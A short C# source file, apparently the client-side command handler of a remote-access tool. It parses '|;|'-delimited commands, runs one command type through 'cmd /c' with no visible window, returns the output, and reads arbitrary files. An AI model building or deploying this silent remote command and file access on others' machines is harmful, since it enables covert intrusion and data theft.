using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client_side
{
    internal class HandleCommand
    {
        public static string ProcessCommand(string command)
        {
            string delimiter = "|;|";
            string[] commandParts = command.Split(delimiter);
            string type = commandParts[0];
            string result = string.Empty;
            switch (type)
            {
                case "1":
                    result = ExecuteCommand(commandParts[1]);
                    break;
                case "2":
                    result = "Command type not supported";
                    break;
                default:
                    result = "Invalid command type";
                    break;
            }

            return result;
        }
        public static string ExecuteCommand(string command)
        {
            string result = string.Empty;
            try
            {
                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                procStartInfo.CreateNoWindow = true;
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                result = proc.StandardOutput.ReadToEnd();
            }
            catch (Exception e)
            {
                result = e.Message;
            }
            return result;
        }

        public static byte[] GetFile(string command)
        {
            return System.IO.File.ReadAllBytes(command);
        }
    }
}
